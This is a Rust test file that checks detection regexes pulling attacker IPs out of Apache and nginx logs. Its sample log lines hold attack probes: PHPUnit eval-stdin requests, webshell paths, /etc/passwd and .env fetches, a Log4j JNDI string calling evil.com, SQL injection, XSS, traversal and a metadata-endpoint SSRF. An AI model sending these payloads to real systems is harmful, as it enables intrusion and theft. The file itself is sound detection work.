use regex::Regex;

#[test]
fn test_apache_ah01617_user_not_found() {
    let re = Regex::new(r"\[client (\d+\.\d+\.\d+\.\d+)(?::\d+)?\].*AH01617:.*user .* not found")
        .unwrap();

    let line = "[Wed Jan 15 14:00:01.123456 2025] [auth_basic:error] [pid 1234] [client 198.51.100.5:43210] AH01617: user admin not found: /secret/";
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "198.51.100.5"
    );
}

#[test]
fn test_apache_ah01618_password_mismatch() {
    let re = Regex::new(r"\[client (\d+\.\d+\.\d+\.\d+)(?::\d+)?\].*AH01618:.*password mismatch")
        .unwrap();

    let line = "[Wed Jan 15 14:01:10.000000 2025] [auth_basic:error] [pid 5678] [client 203.0.113.99:55001] AH01618: user admin: password mismatch: /admin/";
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "203.0.113.99"
    );
}

#[test]
fn test_apache_ah01776_not_authorized() {
    let re =
        Regex::new(r"\[client (\d+\.\d+\.\d+\.\d+)(?::\d+)?\].*AH01776:.*user .* not authorized")
            .unwrap();

    let line = "[Wed Jan 15 14:02:00.000000 2025] [authz_core:error] [pid 9999] [client 10.0.0.200:12345] AH01776: user bob: not authorized to access /private/";
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "10.0.0.200"
    );
}

#[test]
fn test_nginx_user_not_found() {
    let re = Regex::new(r#"user ".*" was not found.*client: (\d+\.\d+\.\d+\.\d+)"#).unwrap();

    let line = "2025/01/15 14:03:12 [error] 1234#0: *1 user \"admin\" was not found in \"/etc/nginx/.htpasswd\", client: 172.16.0.77, server: example.com, request: \"GET /admin/ HTTP/1.1\"";
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "172.16.0.77"
    );
}

#[test]
fn test_nginx_password_mismatch() {
    let re = Regex::new(r#"user ".*" password mismatch.*client: (\d+\.\d+\.\d+\.\d+)"#).unwrap();

    let line = "2025/01/15 14:04:00 [error] 1234#0: *2 user \"root\" password mismatch, client: 192.0.2.111, server: example.com, request: \"GET /private/ HTTP/1.1\"";
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "192.0.2.111"
    );
}

#[test]
fn test_nginx_access_phpunit_eval_stdin() {
    let re = Regex::new(r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "[A-Z]+ [^"]*eval-stdin\.php"#)
        .unwrap();

    let line = r#"89.248.168.239 - - [05/Mar/2026:02:18:53 +0000] "POST /wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 444 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36" rt=0.000"#;
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "89.248.168.239"
    );
}

#[test]
fn test_nginx_access_wp_plugin_phpunit_path() {
    let re = Regex::new(
        r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "[A-Z]+ /wp-content/[^"]*(?:phpunit|vendor/[^"]*\.php|eval)[^"]*""#,
    )
    .unwrap();

    let line = r#"89.248.168.239 - - [05/Mar/2026:02:18:56 +0000] "POST /wp-content/plugins/developer/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 444 0 "-" "Mozilla/5.0" rt=0.000"#;
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "89.248.168.239"
    );
}

#[test]
fn test_nginx_access_webshell_probe() {
    let re = Regex::new(
        r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "[A-Z]+ [^"]*(?:c99|r57|b374k|webshell|shell|cmd|wso)\.php"#,
    )
    .unwrap();

    let line = r#"203.0.113.5 - - [05/Mar/2026:03:00:00 +0000] "GET /uploads/shell.php HTTP/1.1" 404 0 "-" "python-requests/2.28" rt=0.000"#;
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "203.0.113.5"
    );
}

#[test]
fn test_nginx_access_sensitive_file_probe() {
    let re = Regex::new(
        r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "GET [^"]*(?:\.env|wp-config\.php|/\.git/|/\.svn/|/etc/passwd|/etc/shadow|/proc/self)"#,
    )
    .unwrap();

    let line = r#"198.51.100.9 - - [05/Mar/2026:04:11:22 +0000] "GET /.env HTTP/1.1" 200 512 "-" "curl/7.88.1" rt=0.001"#;
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "198.51.100.9"
    );
}

#[test]
fn test_nginx_access_php_code_injection_query() {
    let re = Regex::new(
        r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "[A-Z]+ [^"]*\?(?:cmd|exec|system|passthru|eval|shell_exec)="#,
    )
    .unwrap();

    let line = r#"192.0.2.77 - - [05/Mar/2026:05:00:01 +0000] "GET /index.php?cmd=whoami HTTP/1.1" 200 23 "-" "curl/7.88" rt=0.002"#;
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "192.0.2.77"
    );
}

#[test]
fn test_nginx_access_log4j_jndi() {
    let re = Regex::new(r#"^(\d+\.\d+\.\d+\.\d+) .*?(?:\$\{jndi:|%24%7Bjndi:)"#).unwrap();

    let line = r#"198.51.100.1 - - [05/Mar/2026:06:00:00 +0000] "GET /?v=${jndi:ldap://evil.com/a} HTTP/1.1" 404 0 "-" "Mozilla""#;
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "198.51.100.1"
    );
}

#[test]
fn test_nginx_access_path_traversal() {
    let re = Regex::new(
        r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "(?i)[a-z]+ [^"]*(?:\.\./\.\./|\.\.\\\.\.\\|%2e%2e%2f|%252e%252e%252f)"#,
    )
    .unwrap();

    let line = r#"203.0.113.88 - - [05/Mar/2026:06:10:00 +0000] "GET /../../../etc/passwd HTTP/1.1" 403 0 "-" "curl""#;
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "203.0.113.88"
    );

    let line2 = r#"203.0.113.89 - - [05/Mar/2026:06:10:00 +0000] "GET /%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1" 403 0 "-" "curl""#;
    assert_eq!(
        re.captures(line2).unwrap().get(1).unwrap().as_str(),
        "203.0.113.89"
    );
}

#[test]
fn test_nginx_access_sqli() {
    let re = Regex::new(
        r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "(?i)[a-z]+ [^"]*(?:UNION(?:%20|\+)(?:ALL(?:%20|\+))?SELECT|%27\s*(?:OR|AND)\s*(?:%27|\d)|'\s*(?:OR|AND)\s*('\d|\d))"#,
    )
    .unwrap();

    let line1 = r#"192.0.2.100 - - [05/Mar/2026:06:20:00 +0000] "GET /?id=1' OR 1=1 HTTP/1.1" 200 44 "-" "Mozilla""#;
    assert_eq!(
        re.captures(line1).unwrap().get(1).unwrap().as_str(),
        "192.0.2.100"
    );

    let line2 = r#"192.0.2.101 - - [05/Mar/2026:06:20:00 +0000] "GET /?id=1 UNION+ALL+SELECT 1,2,3 HTTP/1.1" 200 44 "-" "Mozilla""#;
    assert_eq!(
        re.captures(line2).unwrap().get(1).unwrap().as_str(),
        "192.0.2.101"
    );
}

#[test]
fn test_nginx_access_xss() {
    let re = Regex::new(
        r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "(?i)[a-z]+ [^"]*(?:<script>|%3Cscript%3E|javascript:|alert\()"#,
    )
    .unwrap();

    let line = r#"198.51.100.40 - - [05/Mar/2026:06:30:00 +0000] "GET /?q=<script>alert(1)</script> HTTP/1.1" 200 44 "-" "Mozilla""#;
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "198.51.100.40"
    );
}

#[test]
fn test_nginx_access_metadata_ssrf() {
    let re =
        Regex::new(r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "[A-Z]+ [^"]*169\.254\.169\.254"#)
            .unwrap();

    let line = r#"10.0.0.5 - - [05/Mar/2026:06:40:00 +0000] "GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 403 0 "-" "-""#;
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "10.0.0.5"
    );
}

#[test]
fn test_nginx_access_scanner_bots() {
    let re = Regex::new(
        r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "[A-Z]+ [^"]*" \d+ \d+ "[^"]*" "(?i)[^"]*(?:nuclei|zgrab|masscan|zmeu|nikto)"#,
    )
    .unwrap();

    let line = r#"172.16.0.42 - - [05/Mar/2026:06:50:00 +0000] "GET / HTTP/1.1" 200 1024 "-" "nuclei-v2.8.0""#;
    assert_eq!(
        re.captures(line).unwrap().get(1).unwrap().as_str(),
        "172.16.0.42"
    );
}
